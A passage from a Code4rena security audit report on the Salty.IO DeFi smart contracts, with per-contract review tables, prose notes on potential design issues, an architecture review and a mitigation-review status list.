| DAOConfig | changeBootstrappingRewards            | onlyOwner, probably DAO | Comments and code match up, 50k-500k   |
| DAOConfig | changePercentPolRewardsBurned         | onlyOwner, probably DAO | Comments and code match up, 25-75      |
| DAOConfig | changeBaseBallotQuorumPercent         | onlyOwner, probably DAO | Comments and code match up, 5000-20000 |
| DAOConfig | changeBallotDuration                  | onlyOwner, probably DAO | Comments and code match up, 3-14       |
| DAOConfig | changeRequiredProposalPercentStake    | onlyOwner, probably DAO | Comments and code match up, 100-2000   |
| DAOConfig | changeMaxPendingTokensForWhitelisting | onlyOwner, probably DAO | Comments and code match up, 3-12       |
| DAOConfig | changeArbitrageProfitsPercentPOL      | onlyOwner, probably DAO | Comments and code match up, 5-45       |
| DAOConfig | changeUpkeepRewardPercent             | onlyOwner, probably DAO | Comments and code match up, 1-10       |

- Same as other Config files, used in Parameter, which is inherited from DAO.sol. There are 8 changes here, so there must be 8 changes in the Parameter contract as well.

**[Proposals.sol](https://github.com/code-423n4/2024-01-salty/blob/main/src/dao/Proposals.sol)**

| Contract  | Function                    | Access                             | Comments                                                                                             |
| --------- | --------------------------- | ---------------------------------- | ---------------------------------------------------------------------------------------------------- |
| Proposals | \_possiblyCreateProposal    | internal (DAO and public can call) | Users must have a percentage of salt stake to call a proposal, one user can propose only one ballot  |
| Proposals | createConfirmationProposal  | called by DAO                      | DAO doesn't need any staked SALT to call a proposal                                                  |
| Proposals | markBallotAsFinalized       | called by DAO                      | This should be internal? If called this accidentally, then proposal will be voided                   |
| Proposals | proposeParameterBallot      | anyone can call                    | Only one proposal per address, to prevent spam                                                       |
| Proposals | proposeTokenWhitelisting    | anyone can call                    | Maximum of 12, default 5                                                                             |
| Proposals | proposeTokenUnwhitelisting  | anyone can call                    | DAO doesn't need any staked SALT to call a proposal                                                  |
| Proposals | proposeSendSALT             | anyone can call                    | Would be quite funny to propose sending salt to yourself                                             |
| Proposals | proposeCallContract         | anyone can call                    | This is quite dangerous as no one knows what the arbitrary contract code holds                       |
| Proposals | proposeCountryInclusion     | anyone can call                    | Interesting requirement of 2 bytes ISO 3166 Alpha-2 Code, can this be bypassed?                      |
| Proposals | proposeCountryExclusion     | anyone can call                    | Excludes a country, is there any country where it must be always excluded? Like tokenunwhitelisting? |
| Proposals | proposeSetContractAddress   | anyone can call                    | Also can be quite dangerous                                                                          |
| Proposals | proposeWebsiteUpdate        | anyone can call                    | website might not even be a proper one                                                               |
| Proposals | castVote                    | anyone with staked salt            | I like how there is recasting of votes. Votes can only be called once                                |
| Proposals | requiredQuorumForBallotType | anyone with staked salt            | whitelist token needs 2x the base quorum, more important things like changing website need 3x        |

- Good that only one user can open one active proposal to prevent spamming
- The salt staking is quite interesting, because before any stake, a user can propose anything without much salt
- It's a proposal phase so even though anyone can create a proposal, it's still a DAO effort to make sure it passes or not
- All the contracts call the proper channels
- Casting vote checks that the amount of votes can only be used once per ballot
- The required quorum checks for the votes percentage correctly.

**[Parameters.sol](https://github.com/code-423n4/2024-01-salty/blob/main/src/dao/Parameters.sol)**

| Contract   | Function                 | Access        | Comments          |
| ---------- | ------------------------ | ------------- | ----------------- |
| Parameters | \_executeParameterChange | internal call | Abstract contract |

- Make sure that StakingConfig has 4 types, DAOConfig has 8 types, rewardsConfig has 4 types, StableConfig has 6 types, PoolsConfig has 2 types, PriceAggregator has 2 types
- Function is written properly and all else if calls are correctly placed.
- All intended changes and increments are written correctly

**[Airdrop.sol](https://github.com/code-423n4/2024-01-salty/blob/main/src/launch/Airdrop.sol)**

| Contract | Function         | Access                            | Comments                                                                                                 |
| -------- | ---------------- | --------------------------------- | -------------------------------------------------------------------------------------------------------- |
| Airdrop  | authorizeWallet  | only BootstrapBallot can call     | allowClaiming must not be called first                                                                   |
| Airdrop  | allowClaiming    | only InitialDistribution can call | users who are authorized can claim, but that means that there must be salt balance in the contract first |
| Airdrop  | claimAirdrop     | only authorized wallet            | after allowclaiming and is authorized, only can claim once                                               |
| Airdrop  | isAuthorized     | view function                     | Uses Enumerable Set, added from authorizeWallet function                                                 |
| Airdrop  | numberAuthorized | view function                     | Simply checks the length                                                                                 |

- The first thing that happens is that the bootstrap Ballot must authorize all the wallet it wants to authorize
- Once allow claiming is called (can only be called once), then there is no more authorized wallet.
- This means even before the salt is sent to the initial distribution contract, some wallets must already be authorized.
- Users must vote in order to be authorized in BootstrapBallot.sol

- For users, they have to vote first, then wait until initial distribution is called, then call claimAirdrop(). They can only claim once. Their tokens will pass through the staking contract and then be transferred to the user (must check this interaction)
- Is this authorization independent from the entire protocol? In other words, does it affect anything else?
- All functions are checked to be written correctly. Users that are not authorized cannot claim. Also, once initial distribution starts, no one can be authorized anymore.

**[BootstrapBallot.sol](https://github.com/code-423n4/2024-01-salty/blob/main/src/launch/BootstrapBallot.sol)**

| Contract        | Function        | Access                        | Comments                                                                |
| --------------- | --------------- | ----------------------------- | ----------------------------------------------------------------------- |
| BootstrapBallot | constructor     | -                             | Take note of the ballotDuration, most important part of this contract   |
| BootstrapBallot | vote            | only users with the signature | signature check done offchain. Message hash includes the msg.sender     |
| BootstrapBallot | finalizeBallot  | public                        | If votes are equal, also assume fail. Function can only be called once. |
| BootstrapBallot | authorizeWallet | only BootstrapBallot can call | allowClaiming must not be called first                                  |

- Only can vote once, but must call vote() to be authorized
- **Potential Issue** What if the majority votes to not start the exchange? what happens? The whole contract is redeployed? Also, is getting whitelisted easy? Can users just keep voting no with multiple accounts? (because they will still get airdrop anyways if the votes succeed)
- If succeed, will call initialdistribution.distributionApproved, and then airdrop.allowClaiming will be called. startExchangeApproved() will also be called.
- Voting and finalizing is done correctly. Pools and initial distribution does receive the approval

**[InitialDistribution.sol]**

| Contract            | Function             | Access                        | Comments                                            |
| ------------------- | -------------------- | ----------------------------- | --------------------------------------------------- |
| InitialDistribution | distributionApproved | Only BootstrapBallot can call | The 100M salt token must already be in the contract |

- 52M to emissions, 25M to DAO vesting wallet, 10M to Team vesting wallet, 5M to airdrop participants, 5M to liquidity and 3M to staking, total to 100M.
- No salt should be left in this contract after distributionApproved is called.
- Once distributionApproved is called, no more wallets can be authorized. So these wallets may be on the whitelist but if they don't vote, they don't get the airdrop.
- This function assumes that the Ballot succeeds, and the WhitelistedPools is correct.
- No potential issues in this contract alone. MILLION_ETHER is written correctly, every calculation is multiplied properly. Check cannot be griefed because no other SALT can be minted other than the 100M given to the msg.sender of the SALT contract.

**[PriceAggregator.sol](https://github.com/code-423n4/2024-01-salty/blob/main/src/price_feed/PriceAggregator.sol)**

| Contract        | Function                                         | Access                  | Comments                                                                          |
| --------------- | ------------------------------------------------ | ----------------------- | --------------------------------------------------------------------------------- |
| PriceAggregator | setInitialFeeds                                  | onlyOwner, probably DAO | The require statement is a little wrong, more comments below                      |
| PriceAggregator | setPriceFeed                                     | onlyOwner, probably DAO | Call once every 35 days, priceFeedModificationCooldown can be changed, 30-45 days |
| PriceAggregator | changeMaximumPriceFeedPercentDifferenceTimes1000 | onlyOwner, probably DAO | Same as other Config files, comments and code match up, from 1000 - 7000          |
| PriceAggregator | changePriceFeedModificationCooldown              | onlyOwner, probably DAO | comments and code match up, from 30-45 days                                       |
| PriceAggregator | \_aggregatePrices                                | internal                | gets the average of the two closest price                                         |

- **Potential Issue:** in setInitialFeeds, if owner sets the first price feed1 as 0 address, then he can call setInitialFeeds again
- Not sure about the purpose of a `priceFeedModificationCooldown` since it's only changed if something serious is going to happen / has happened. It should be able to be changed immediately.
- Config files are set properly, with lower bound and upper bound tallying up with the comments
- Aggregate prices is written correctly. Even if 1 price feed returns 0, hopefully the other two price feeds returns the correct price, and gets the average sum
- The percentageDifference tolerance is about 3%, and be changed from 1% - 7%

**[CoreSaltyFeed.sol](https://github.com/code-423n4/2024-01-salty/blob/main/src/price_feed/CoreSaltyFeed.sol)**

| Contract      | Function    | Access                                                       | Comments                                                                                 |
| ------------- | ----------- | ------------------------------------------------------------ | ---------------------------------------------------------------------------------------- |
| CoreSaltyFeed | getPriceBTC | view function, called by PriceAggregator, no change of state | Check that reservesWBTC is in 8 decimals when pools.getPoolReserves is called            |
| CoreSaltyFeed | getPriceETH | view function, called by PriceAggregator, no change of state | Check that pools.getPoolReserves returns the proper reservesWETH and reservesUSDS amount |

- The reserve price cannot be less than DUST, which is 100.
- This contract interacts with pools.getPoolReserves, so must check whether that function returns the correct amount

**[RewardsConfig.sol](https://github.com/code-423n4/2024-01-salty/blob/main/src/rewards/RewardsConfig.sol)**

| Contract      | Function                         | Access                  | Comments                                                    |
| ------------- | -------------------------------- | ----------------------- | ----------------------------------------------------------- |
| RewardsConfig | changeRewardsEmitterDailyPercent | OnlyOwner, probably DAO | Comments and Code match up, from 250 - 2500 (0.25% to 2.5%) |
| RewardsConfig | changeEmissionsWeeklyPercent     | OnlyOwner, probably DAO | Comments and Code match up, from 250 - 1000 (0.25% to 1%)   |
| RewardsConfig | changeStakingRewardsPercent      | OnlyOwner, probably DAO | Comments and Code match up, from 25 - 75 (25% to 75%)       |
| RewardsConfig | changePercentRewardsSaltUSDS     | OnlyOwner, probably DAO | Comments and Code match up, from 5 - 25 (5% to 25%)         |

- Probably same as StakingConfig and the other Configs file, all change is called in Parameter.sol which is an abstract contract inherited by DAO.sol

**[Emissions.sol](https://github.com/code-423n4/2024-01-salty/blob/main/src/rewards/Emissions.sol)**

| Contract  | Function      | Access                        | Comments                                              |
| --------- | ------------- | ----------------------------- | ----------------------------------------------------- |
| Emissions | performUpkeep | Only Upkeep contract can call | Calls rewardsConfig.emissionsWeeklyPercentTimes1000() |

- Upkeep contract is set in the ExchangeConfig contract
- Checked the calculation of saltToSend, seems correct

```

uint256 saltToSend = ( saltBalance * timeSinceLastUpkeep * rewardsConfig.emissionsWeeklyPercentTimes1000() ) / ( 100 * 1000 weeks );

Assume 100e18 as saltBalance, 0.5% should be 5e17.

(1 second)
100e18 * 1 * 500 / (100 * 1000 * 604800) = 826719576720

(1 week)
100e18 * 604800 * 500 / (100 * 1000 * 604800) = 5e17 (0.5%)
```

- This is called in the Upkeep contract, at step 6. It is assumed that the emission contract already has some salt balance? I think it's from initial distribution of 52 million salt.
- **Potential Issue:** Must check last emission, whether it will truncate to zero, apparently dust values would truncate.
- Emission calculation is checked, timeSinceLastUpkeep is checked, max of 1 week.

**[USDS.sol](https://github.com/code-423n4/2024-01-salty/blob/main/src/stable/USDS.sol)**

| Contract | Function                  | Access                             | Comments                                                                                       |
| -------- | ------------------------- | ---------------------------------- | ---------------------------------------------------------------------------------------------- |
| USDS     | setCollateralAndLiquidity | onlyOwner, inherited Ownable       | renounceOwnership() can be dangerous is the collateralAndLiquidity contract address is changed |
| USDS     | mintTo                    | only collateralAndLiquidityCanCall | check how collateralAndLiquidity calls `mintTo`, check whether `amount` can be manipulated     |
| USDS     | burnTokensInContract      | public                             | will only be an error if DAO mistakenly deposits USDS into contract                            |

- Inherits ERC20, Ownable
- Inheritance is correct, the minting from collateral contract is also correct.

**[StakingConfig.sol](https://github.com/code-423n4/2024-01-salty/blob/main/src/staking/StakingConfig.sol)**

| Contract      | Function                   | Access            | Comments                                           |
| ------------- | -------------------------- | ----------------- | -------------------------------------------------- |
| StakingConfig | changeMinUnstakeWeeks      | onlyOwner, is DAO | Comments and code match up, range only from 1-12   |
| StakingConfig | changeMaxUnstakeWeeks      | onlyOwner, is DAO | Comments and code match up, range only from 20-108 |
| StakingConfig | changeMinUnstakePercent    | onlyOwner, is DAO | Comments and code match up, range only from 10-50  |
| StakingConfig | changeModificationCooldown | onlyOwner, is DAO | Comments and code match up, range only from 15-600 |

- All the change is called in Parameter.sol, which is an abstract contract inherited from the DAO
- Only DAO can call these changes, which is changed through a balloting process
- The increase and decrease can be quite inconvenient (If minUnstakeWeeks is currently at 1, then have to call 11 times to become 12), but it's probably a design decision
- **Potential Issue**: changeminunstake weeks ranges from 1-12, but docs mention 2-12.
- All other comments are checked to be consistent with the code

**[ManagedWallet.sol](https://github.com/code-423n4/2024-01-salty/blob/main/src/ManagedWallet.sol)**

| Contract      | Function       | Access                       | Comments                                                                                             |
| ------------- | -------------- | ---------------------------- | ---------------------------------------------------------------------------------------------------- |
| ManagedWallet | proposeWallets | called by mainWallet         | 2-step transfer to change the mainwallet and confirmation wallet                                     |
| ManagedWallet | receive()      | called by confirmationWallet | Ether is stuck in contract, and the confirmationWallet can alter the activeTimelock duration anytime |
| ManagedWallet | changeWallets  | called by proposedMainWallet | Must wait for activeTimelock to set and reset the variables                                          |

- Interesting to see how the mainWallet only can call proposeWallet and the confirmation wallet only can set the activeTimelock.
- **3 potential issues:**
- 1. The activeTimelock can be set even before proposeWallets is called, so the activeTimelock can be bypassed
- 2. The contract cannot draw out the ether, ether stuck in contract
- 3. Confirmation wallet can reject the whole proposal by either not calling the contract or just sending in 1 wei

**[AccessManager.sol](https://github.com/code-423n4/2024-01-salty/blob/main/src/AccessManager.sol)**

| Contract      | Function                 | Access                                | Comments                                                                                             |
| ------------- | ------------------------ | ------------------------------------- | ---------------------------------------------------------------------------------------------------- |
| AccessManager | excludedCountriesUpdated | called by DAO                         | can be inconvenient because all verified wallets have to be verified again, does it affect anything? |
| AccessManager | grantAccess              | public, users must have the signature | geoVersion can be changed                                                                            |
| AccessManager | \_verifyAccess           | internal, called by grantAccess       | Check whether the \_verifySignature function is written correctly                                    |

- grantAccess / walletHasAccess is used by which contracts?

**[Salt.sol](https://github.com/code-423n4/2024-01-salty/blob/main/src/Salt.sol)**

| Contract | Function             | Access   | Comments                                                                     |
| -------- | -------------------- | -------- | ---------------------------------------------------------------------------- |
| Salt     | constructor          | one time | mints 100M salt to msg.sender, and doesn't have any mint, consider hard cap? |
| Salt     | burnTokensInContract | public   | same as USDS, error will be on the user side                                 |

- Inherits ERC20
- Mint is correct, mints to a msg.sender, which is supposed to be sent to the InitialDistribution.

### Architecture Review

**Design Patterns and Best Practices**

- Common design patterns are used, like onlyOwner, or checking for DAO access, or reentrancy guards
- Abstract contracts and Inheritance is used well
- Nuances like checking for DUST amounts, having min-collateral and initial-collateral, having a time delay for staking and unstaking shows that the protocol is written well

**Code Readability and Maintainability**

- Code is quite difficult to read due to the sheer size of the codebase and the amount of Math involved in AMM.
- Code also has a lot of external calls to other contracts which is quite confusing, but there is a common pattern of using Config and Parameters 
- There is also a lot of internal calls, but that is to be expected from a large codebase with many different function

**Error Handling and Input Validation**

- Events and Error messages are easy to understand
- Input is validated well in every config file, and the code matches the comments

**Interoperability and Standards Compliance**

- Good knowledge of the ERC20 standard when creating USDS and SALT tokens 

**Testing and Documentation**

- Extensive tests (unit, integration tests) done, reaching an overall coverage of almost 100% 
- Documentation (whitepaper, github) is plentiful and includes quality reasoning at every juncture of the protocol 
- **One improvement could be having more diagrams and a summarized version of how the protocol works from the top down, with a end-to-end scenario of how a user can interact with the protocol  (what function should the user call first, what can a user accomplish, why is the user incentivized to use the protocol)**

**Upgradeability**

- Protocol is not intended to be upgradeable, but contracts can be redeployed and rerouted easily through the changeManagers and changeRegistries function.

**Dependency Management**

Protocol relies on external libraries like OpenZeppelin. Protocol should keep an eye on vulnerabilities that affects those external integrations, and make changes where necessary.

Overall, great architecture from the protocol, slight changes would be to the written code itself (using modifiers for repeated code, checking zero values, checking overflows etc) and more real life scenarios in the documentation.

**Centralization Risk**

Not much centralization risk as the protocol is almost run fully on the DAO and votes. The only thing the DAO can do is control which proposals to be passed by finalizing the Ballot. Otherwise, most of the protocol functions like clockwork.

### Time spent:
40 hours

***

# [Mitigation Review](#mitigation-review)

## Introduction

Following the C4 audit, 3 wardens [0xpiken](https://code4rena.com/@0xpiken), [t0x1c](https://code4rena.com/@t0x1c), and [zzebra83](https://code4rena.com/@zzebra83) reviewed the mitigations for all identified issues. Additional details can be found within the [C4 Salty.IO Mitigation Review repository](https://github.com/code-423n4/2024-03-saltyio-mitigation).

## Overview of Changes

**[Summary from the Sponsor](https://github.com/code-423n4/2024-03-saltyio-mitigation?tab=readme-ov-file#overview-of-changes):**

To decrease the risk profile of the exchange and focus on the core features provided by automatic arbitrage, the USDS stablecoin and all associated functionality (price feeds, collateral, liquidizer, etc) have been completely removed. The stablecoin was largely isolated from the rest of the project, but this did refactor the way Upkeep works.

Resulting from the stablecoin being removed all tokens are now paired with WETH and USDC rather than WETH and WBTC (which was previously done to provide increased yield for now removed collateral).

Also, the ManagedWallet contract has been removed - with the teamVestingWallet now targeting a simple teamWallet address.

To prevent any swaps from occurring during performUpkeep, Protocol Owned Liquidity has been removed. Additionally, on user swap any WETH profits that are generated are swapped immediately to SALT - rather than being done in performUpkeep.

In response to a suggestion by one of the wardens in the original competition, the ArbitrageSearch mechanism has been refactored and optimized extensively: https://github.com/code-423n4/2024-01-salty-findings/issues/419

Users are now limited to one swap per block due to an issue found in which arbitrage could be bypassed by dividing up individual swaps into tens or hundreds of swaps. Without the limitation and due to the protocol's reletively low gas costs for swap and arbitrage, attackers would otherwise be able to perform multiple swaps in one transaction - effectively bypassing arbitrage and the rebalancing done that discourages manipulation. While multiple wallets could still be used on such an attack, the gas costs incurred on the multiple separate swap transactions are considered a sufficient deterrent.

## Mitigation Review Scope

| URL | Mitigation of | Purpose | 
| ----------- | ------------- | ----------- |
| https://github.com/othernet-global/salty-io/commit/5766592880737a5e682bb694a3a79e12926d48a5 | H-01 | ManagedWallet has been removed. VestingWallet now just vests directly to teamWallet. | 
| https://github.com/othernet-global/salty-io/commit/4f0c9c6a6e3e4234135ab7119a0e380af3e9776c | H-02 | performUpkeep is now called at the start of BootstrapBallot.finalizeBallot to reset the emissions timers just before liquidity rewards claiming is started.|
| https://github.com/othernet-global/salty-io/commit/8e3231d3f444e9851881d642d6dd03021fade5ed | H-03 | The stablecoin framework has been removed: /stablecoin, /price_feed, WBTC/WETH collateral, PriceAggregator, price feeds and USDS.|
| https://github.com/othernet-global/salty-io/commit/5f79dc4f0db978202ab7da464b09bf08374ec618 | H-04 | virtualRewards and userShare are now uint256 rather than uint128.|
| https://github.com/othernet-global/salty-io/commit/8e3231d3f444e9851881d642d6dd03021fade5ed | H-05 | The stablecoin framework has been removed: /stablecoin, /price_feed, WBTC/WETH collateral, PriceAggregator, price feeds and USDS.|
| https://github.com/othernet-global/salty-io/commit/8e3231d3f444e9851881d642d6dd03021fade5ed | H-06 | The stablecoin framework has been removed: /stablecoin, /price_feed, WBTC/WETH collateral, PriceAggregator, price feeds and USDS.|
| https://github.com/othernet-global/salty-io/commit/b3b8cb955db2b9f0e47a4964e1e4f833a447a72d | M-01 | virtualRewards now rounded up on _decreaseUserShare |
| https://github.com/othernet-global/salty-io/commit/5f1a5206a04b0f3fe45ad88a311370ce12fb0135 | M-02 | callFromDAO now wrapped in a try/catch |
| https://github.com/othernet-global/salty-io/commit/ccf4368fcf1777894417fccd2771456f3eeaa81c | M-03 | There is now no limit to the number of tokens that can be proposed for whitelisting. Also, any whitelisting proposal that has reached quorum with sufficient approval votes can be executed. |
| https://github.com/othernet-global/salty-io/commit/8e3231d3f444e9851881d642d6dd03021fade5ed | M-04 | The stablecoin framework has been removed: /stablecoin, /price_feed, WBTC/WETH collateral, PriceAggregator, price feeds and USDS.|
| https://github.com/othernet-global/salty-io/commit/8e3231d3f444e9851881d642d6dd03021fade5ed | M-05 | The stablecoin framework has been removed: /stablecoin, /price_feed, WBTC/WETH collateral, PriceAggregator, price feeds and USDS.|
| https://github.com/othernet-global/salty-io/commit/758349850a994c305a0ab9a151d00e738a5a45a0 | M-06 | ballotMaximumDuration added. There is now a default 30 day period after which ballots can be removed by any user. |
| https://github.com/othernet-global/salty-io/commit/5766592880737a5e682bb694a3a79e12926d48a5 | M-07 | ManagedWallet has been removed. |
| https://github.com/othernet-global/salty-io/commit/8e3231d3f444e9851881d642d6dd03021fade5ed | M-08 | The stablecoin framework has been removed: /stablecoin, /price_feed, WBTC/WETH collateral, PriceAggregator, price feeds and USDS.|
| https://github.com/othernet-global/salty-io/commit/b01f6e5cb360e89f9e4cdae41d609ea747bcaa86 | M-09 | Fixes reserves DUST check |
| https://github.com/othernet-global/salty-io/commit/c46069644739885fa36e84e27e1dd6362b854663 | M-11 | Ballots now keep track of their own requiredQuorum at the time they were created. |
| https://github.com/othernet-global/salty-io/commit/39921b4a25041c7ac4e9b5279e12bb2ec518140b | M-12 | ballotNames now include all provided proposal arguments. |
| https://github.com/othernet-global/salty-io/commit/8e3231d3f444e9851881d642d6dd03021fade5ed | M-13 | The stablecoin framework has been removed: /stablecoin, /price_feed, WBTC/WETH collateral, PriceAggregator, price feeds and USDS.|
| https://github.com/othernet-global/salty-io/commit/ccf4368 | M-14 | Removed maxPendingTokensForWhitelisting. There is now no limit to the number of tokens that can be proposed for whitelisting. Also, any whitelisting proposal that has reached quorum with sufficient approval votes can be executed. |
| https://github.com/othernet-global/salty-io/commit/8e3231d3f444e9851881d642d6dd03021fade5ed | M-15 | The stablecoin framework has been removed: /stablecoin, /price_feed, WBTC/WETH collateral, PriceAggregator, price feeds and USDS.|
| https://github.com/othernet-global/salty-io/commit/a54656dd18135ca57eef7c4bf615b7cdff2613a7 https://github.com/othernet-global/salty-io/commit/53feaeb0d335bd33803f98db022871b48b3f2454 | M-16 | ArbitrageSearch updated as suggested with MSB as well |
| https://github.com/othernet-global/salty-io/commit/8e3231d3f444e9851881d642d6dd03021fade5ed | M-18 | The stablecoin framework has been removed: /stablecoin, /price_feed, WBTC/WETH collateral, PriceAggregator, price feeds and USDS.|
| https://github.com/othernet-global/salty-io/commit/758349850a994c305a0ab9a151d00e738a5a45a0 | M-19 | There is now a default 30 day period after which ballots can be removed by any user. |
| https://github.com/othernet-global/salty-io/commit/eaf40ef0fa27314c6e674db6830990df68e5d70e | M-20 | POL has been removed from the protocol |
| https://github.com/othernet-global/salty-io/commit/eaf40ef0fa27314c6e674db6830990df68e5d70e | M-21 | POL has been removed from the protocol |
| https://github.com/othernet-global/salty-io/commit/8e3231d3f444e9851881d642d6dd03021fade5ed | M-22 | The stablecoin framework has been removed: /stablecoin, /price_feed, WBTC/WETH collateral, PriceAggregator, price feeds and USDS.|
| https://github.com/othernet-global/salty-io/commit/44320a8cc9b94de433e437e025f072aa850b995a | M-25 | Zapping no longer uses scaling.  |
| https://github.com/othernet-global/salty-io/commit/eaf40ef0fa27314c6e674db6830990df68e5d70e | M-26 | POL has been removed from the protocol |
| https://github.com/othernet-global/salty-io/commit/8e3231d3f444e9851881d642d6dd03021fade5ed | M-27 | The stablecoin framework has been removed: /stablecoin, /price_feed, WBTC/WETH collateral, PriceAggregator, price feeds and USDS.|
| https://github.com/othernet-global/salty-io/commit/0bb763cc67e6a30a97d8b157f7e5954692b3dd68 | M-28 | minAddedAmountA and minAddedAmountB are now used. |
| https://github.com/othernet-global/salty-io/commit/8e3231d3f444e9851881d642d6dd03021fade5ed | M-29 | The stablecoin framework has been removed: /stablecoin, /price_feed, WBTC/WETH collateral, PriceAggregator, price feeds and USDS.|
| https://github.com/othernet-global/salty-io/commit/8e3231d3f444e9851881d642d6dd03021fade5ed | M-30 | The stablecoin framework has been removed: /stablecoin, /price_feed, WBTC/WETH collateral, PriceAggregator, price feeds and USDS.|
| https://github.com/othernet-global/salty-io/commit/5766592880737a5e682bb694a3a79e12926d48a5 | M-31 | ManagedWallet has been removed. |

## Additional Mitigation Review Scope

These are additional changes that will be in scope and were addressed outside of direct mitigation.

| URL | Mitigation of | Purpose | 
| ----------- | ----------- |----------- |
| https://github.com/othernet-global/salty-io/commit/f16623e6bf1cdb0845b83ebf3592e30885a8fc61 | E1 | Arbitrage no longer occurs when zapping liquidity | 
| https://github.com/othernet-global/salty-io/commit/75901cae57382a87b5f049d7afb9c5d9b9ba4c19 https://github.com/othernet-global/salty-io/commit/7de25bca740332ae7a4b2f25c3a6f6419eaa7569 | E2 | Arbitrage gas optimization | 
| https://github.com/othernet-global/salty-io/commit/60de2c02bcfbcc64b41c03ea0582ec9e7a3f332a | E3 | Gas stabilization by preventing overwriting zeros after performUpkeep | 
| https://github.com/othernet-global/salty-io/commit/6998661013e86a50c7db552d189fadb0521dbeb0 | E4 | Fixes arbitrage revert when there is zero SALT/WETH liquidity | 
| https://github.com/othernet-global/salty-io/commit/2d1b7df004394720c0d8bb4aefe903021631eff3 | E5 | Limited user swaps to one per block to prevent bypassing arbitrage within a single block | 


## Mitigation Review Summary
| Original Issue | Status | Full Details |
  | --- | --- | --- |
| H-01 |  🟢 Mitigation Confirmed | Reports from  [0xpiken](https://github.com/code-423n4/2024-03-saltyio-mitigation-findings/issues/61), [zzebra83](https://github.com/code-423n4/2024-03-saltyio-mitigation-findings/issues/41), and [t0x1c](https://github.com/code-423n4/2024-03-saltyio-mitigation-findings/issues/33) |
| H-02 |  🟢 Mitigation Confirmed | Reports from  [zzebra83](https://github.com/code-423n4/2024-03-saltyio-mitigation-findings/issues/42), [0xpiken](https://github.com/code-423n4/2024-03-saltyio-mitigation-findings/issues/62), and [t0x1c](https://github.com/code-423n4/2024-03-saltyio-mitigation-findings/issues/32) |
| H-03 |  🟢 Mitigation Confirmed | Reports from  [t0x1c](https://github.com/code-423n4/2024-03-saltyio-mitigation-findings/issues/31), [0xpiken](https://github.com/code-423n4/2024-03-saltyio-mitigation-findings/issues/63), and [zzebra83](https://github.com/code-423n4/2024-03-saltyio-mitigation-findings/issues/43) |
| H-04 |  🟢 Mitigation Confirmed | Reports from  [t0x1c](https://github.com/code-423n4/2024-03-saltyio-mitigation-findings/issues/30), [0xpiken](https://github.com/code-423n4/2024-03-saltyio-mitigation-findings/issues/64), and [zzebra83](https://github.com/code-423n4/2024-03-saltyio-mitigation-findings/issues/44) |
| H-05 |  🟢 Mitigation Confirmed | Reports from  [zzebra83](https://github.com/code-423n4/2024-03-saltyio-mitigation-findings/issues/45), [0xpiken](https://github.com/code-423n4/2024-03-saltyio-mitigation-findings/issues/65), and [t0x1c](https://github.com/code-423n4/2024-03-saltyio-mitigation-findings/issues/28) |
| H-06 |  🟢 Mitigation Confirmed | Reports from  [0xpiken](https://github.com/code-423n4/2024-03-saltyio-mitigation-findings/issues/66), [zzebra83](https://github.com/code-423n4/2024-03-saltyio-mitigation-findings/issues/46), and [t0x1c](https://github.com/code-423n4/2024-03-saltyio-mitigation-findings/issues/29) |
| M-01 | 🔴  Mitigated with an Error | Report from  [t0x1c](https://github.com/code-423n4/2024-03-saltyio-mitigation-findings/issues/25) |
| M-02 |  🟢 Mitigation Confirmed | Reports from  [t0x1c](https://github.com/code-423n4/2024-03-saltyio-mitigation-findings/issues/9), [0xpiken](https://github.com/code-423n4/2024-03-saltyio-mitigation-findings/issues/68), and [zzebra83](https://github.com/code-423n4/2024-03-saltyio-mitigation-findings/issues/48) |
| M-03 |  🟢 Mitigation Confirmed | Reports from  [zzebra83](https://github.com/code-423n4/2024-03-saltyio-mitigation-findings/issues/49), [0xpiken](https://github.com/code-423n4/2024-03-saltyio-mitigation-findings/issues/69), and [t0x1c](https://github.com/code-423n4/2024-03-saltyio-mitigation-findings/issues/10) |
| M-04 |  🟢 Mitigation Confirmed | Reports from  [zzebra83](https://github.com/code-423n4/2024-03-saltyio-mitigation-findings/issues/50), [t0x1c](https://github.com/code-423n4/2024-03-saltyio-mitigation-findings/issues/39) |
| M-05 |  🟢 Mitigation Confirmed | Reports from  [zzebra83](https://github.com/code-423n4/2024-03-saltyio-mitigation-findings/issues/51), [0xpiken](https://github.com/code-423n4/2024-03-saltyio-mitigation-findings/issues/71), and [t0x1c](https://github.com/code-423n4/2024-03-saltyio-mitigation-findings/issues/12) |
| M-06 |  🟢 Mitigation Confirmed | Reports from  [zzebra83](https://github.com/code-423n4/2024-03-saltyio-mitigation-findings/issues/52) |
| M-07 |  🟢 Mitigation Confirmed | Reports from  [t0x1c](https://github.com/code-423n4/2024-03-saltyio-mitigation-findings/issues/11), [0xpiken](https://github.com/code-423n4/2024-03-saltyio-mitigation-findings/issues/73), and [zzebra83](https://github.com/code-423n4/2024-03-saltyio-mitigation-findings/issues/53) |
| M-08 |  🟢 Mitigation Confirmed | Reports from  [zzebra83](https://github.com/code-423n4/2024-03-saltyio-mitigation-findings/issues/54), [0xpiken](https://github.com/code-423n4/2024-03-saltyio-mitigation-findings/issues/74), and [t0x1c](https://github.com/code-423n4/2024-03-saltyio-mitigation-findings/issues/13) |
| M-09 |  🟢 Mitigation Confirmed | Reports from  [t0x1c](https://github.com/code-423n4/2024-03-saltyio-mitigation-findings/issues/14), [0xpiken](https://github.com/code-423n4/2024-03-saltyio-mitigation-findings/issues/75), and [zzebra83](https://github.com/code-423n4/2024-03-saltyio-mitigation-findings/issues/55) |
| M-11 |  🟢 Mitigation Confirmed | Reports from  [zzebra83](https://github.com/code-423n4/2024-03-saltyio-mitigation-findings/issues/57), [0xpiken](https://github.com/code-423n4/2024-03-saltyio-mitigation-findings/issues/76), and [t0x1c](https://github.com/code-423n4/2024-03-saltyio-mitigation-findings/issues/5) |
| M-12 | 🔴  Mitigated with an Error  | Report from [t0x1c](https://github.com/code-423n4/2024-03-saltyio-mitigation-findings/issues/60) |
| M-13 |  🟢 Mitigation Confirmed | Reports from  [0xpiken](https://github.com/code-423n4/2024-03-saltyio-mitigation-findings/issues/78), [zzebra83](https://github.com/code-423n4/2024-03-saltyio-mitigation-findings/issues/96), and [t0x1c](https://github.com/code-423n4/2024-03-saltyio-mitigation-findings/issues/17) |
| M-14 |  🟢 Mitigation Confirmed | Reports from  [0xpiken](https://github.com/code-423n4/2024-03-saltyio-mitigation-findings/issues/79), [zzebra83](https://github.com/code-423n4/2024-03-saltyio-mitigation-findings/issues/97), and [t0x1c](https://github.com/code-423n4/2024-03-saltyio-mitigation-findings/issues/7) |
